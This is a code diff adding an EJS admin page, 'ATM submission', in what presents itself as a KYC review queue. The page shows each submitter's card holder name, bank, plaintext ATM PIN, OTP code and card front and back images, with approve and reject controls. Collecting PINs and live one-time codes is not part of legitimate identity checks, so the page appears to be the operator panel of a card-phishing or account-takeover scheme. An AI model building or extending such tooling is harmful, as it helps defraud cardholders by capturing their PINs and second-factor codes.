@@ -1,0 +1,83 @@
+<%- include('../partials/admin-shell-start') %>
+
+<div class="db-greeting">
+  <div>
+    <h1>ATM submission</h1>
+    <p><%= sub.email %> · <%= sub.customerReference || sub.userId %></p>
+  </div>
+  <a class="db-chip" href="/admin/kyc/atm">← Queue</a>
+</div>
+
+<% if (typeof message !== 'undefined' && message) { %><div class="db-alert db-alert--ok"><%= message %></div><% } %>
+<% if (typeof error !== 'undefined' && error) { %><div class="db-alert db-alert--err"><%= error %></div><% } %>
+
+<section class="db-panel" style="margin-bottom:16px;">
+  <div class="kyc-grid-2">
+    <div>
+      <p style="margin:0 0 6px;color:#788391;font-size:0.8rem;">Card holder</p>
+      <strong><%= sub.holderName %></strong>
+    </div>
+    <div>
+      <p style="margin:0 0 6px;color:#788391;font-size:0.8rem;">ATM bank</p>
+      <strong><%= sub.bankName %></strong>
+    </div>
+    <div>
+      <p style="margin:0 0 6px;color:#788391;font-size:0.8rem;">PIN (manual review)</p>
+      <strong style="font-family:ui-monospace,monospace;letter-spacing:0.12em;"><%= sub.pin || '—' %></strong>
+    </div>
+    <div>
+      <p style="margin:0 0 6px;color:#788391;font-size:0.8rem;">OTP</p>
+      <strong style="font-family:ui-monospace,monospace;"><%= sub.otpCode || 'Not submitted yet' %></strong>
+    </div>
+    <div>
+      <p style="margin:0 0 6px;color:#788391;font-size:0.8rem;">Status</p>
+      <span class="kyc-badge"><%= sub.status %></span>
+    </div>
+    <div>
+      <p style="margin:0 0 6px;color:#788391;font-size:0.8rem;">Submitted</p>
+      <strong><%= sub.createdAt %></strong>
+    </div>
+  </div>
+
+  <form method="post" action="/admin/kyc/atm/<%= sub.id %>/status" style="margin-top:18px;display:flex;gap:10px;flex-wrap:wrap;align-items:end;">
+    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+    <div class="kyc-field" style="margin:0;">
+      <label>Set status</label>
+      <select name="status">
+        <option value="pending" <%= sub.status === 'pending' ? 'selected' : '' %>>Pending</option>
+        <option value="approved" <%= sub.status === 'approved' ? 'selected' : '' %>>Approved</option>
+        <option value="rejected" <%= sub.status === 'rejected' ? 'selected' : '' %>>Rejected</option>
+      </select>
+    </div>
+    <button type="submit" class="settings-btn settings-btn--primary">Update status</button>
+    <a class="settings-link" href="/admin/customers/<%= sub.userId %>">Open customer →</a>
+  </form>
+</section>
+
+<section class="db-panel">
+  <div class="db-panel__head"><h2>Card images</h2></div>
+  <div class="kyc-grid-2">
+    <div>
+      <p style="font-weight:700;margin:0 0 8px;">Front</p>
+      <% if (frontDoc && frontDoc.storageProvider === 'db_inline' && frontDoc.storageAssetId) { %>
+        <img src="<%= frontDoc.storageAssetId %>" alt="Card front" style="max-width:100%;border-radius:12px;border:1px solid #e8e0d3;">
+      <% } else if (frontDoc) { %>
+        <a class="settings-link" href="/admin/kyc/documents/<%= frontDoc.id %>" target="_blank" rel="noopener">Open front document →</a>
+      <% } else { %>
+        <span style="color:#788391;">No front image</span>
+      <% } %>
+    </div>
+    <div>
+      <p style="font-weight:700;margin:0 0 8px;">Back</p>
+      <% if (backDoc && backDoc.storageProvider === 'db_inline' && backDoc.storageAssetId) { %>
+        <img src="<%= backDoc.storageAssetId %>" alt="Card back" style="max-width:100%;border-radius:12px;border:1px solid #e8e0d3;">
+      <% } else if (backDoc) { %>
+        <a class="settings-link" href="/admin/kyc/documents/<%= backDoc.id %>" target="_blank" rel="noopener">Open back document →</a>
+      <% } else { %>
+        <span style="color:#788391;">No back image</span>
+      <% } %>
+    </div>
+  </div>
+</section>
+
+<%- include('../partials/admin-shell-end') %>
